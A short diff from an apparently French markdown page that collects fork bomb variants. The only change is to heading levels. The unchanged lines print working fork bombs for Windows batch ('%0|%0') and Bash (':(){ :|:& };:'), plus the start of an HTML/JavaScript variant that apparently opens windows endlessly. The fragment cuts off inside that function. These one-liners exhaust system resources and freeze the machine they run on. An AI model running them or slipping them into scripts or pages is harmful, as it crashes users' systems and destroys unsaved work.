@@ -19,17 +19,17 @@ goto :start
 ```
 Source : [Github](#Télécharger-depuis-Github)
 
-# Variante Windows (Batch)
+## Variante Windows (Batch)
 ```
 %0|%0
 ```
 
-# Variante Linux (Bash)
+## Variante Linux (Bash)
 ```
 :(){ :|:& };:
 ```
 
-# Variante HTML / JS
+## Variante HTML / JS
 ```
 <script type="text/javascript">
   function open_target_blank() 
